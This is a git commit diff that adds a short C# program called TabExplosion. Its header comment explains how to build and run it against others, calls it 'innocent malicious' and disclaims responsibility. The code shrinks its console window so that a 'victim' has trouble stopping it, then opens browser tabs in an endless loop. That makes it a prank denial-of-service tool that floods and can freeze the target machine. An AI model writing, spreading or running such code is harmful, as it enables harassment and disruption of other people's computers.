bdbcceb6ce0a1b5535a45ce2b8acff6e6d92bdaf
Andrew Gunderman <agunderman10@gmail.com>
2018-07-23 01:20:23 -0400

    *Previous commit message here*

---
+++ TabExplosion/TabExplosion/TabIteration.cs
@@ -0,0 +1,25 @@
+﻿/*To use, clone this repo and go to TabExplosion file, then bin, Debug, and copy the .exe file
+or the file named TabExplosion. The file can be executed by clicking on it. I would advise against
+opening the file on your own computer. The website that is opened can be changed according to 
+user wishes. This file is created for innocent malicious purposes. I am not responsible for whatever
+you may choose to do with it.*/
+
+using System;
+
+namespace TabExplosion
+{
+    class TabIteration
+    {
+        static void Main(string[] args)
+        {
+            //Set to make it more difficult to stop iteration by a victim
+            Console.SetWindowSize(1,1);
+
+            while(true)
+            {
+                System.Diagnostics.Process.Start("http://www.google.com");
+            }
+
+        }
+    }
+}
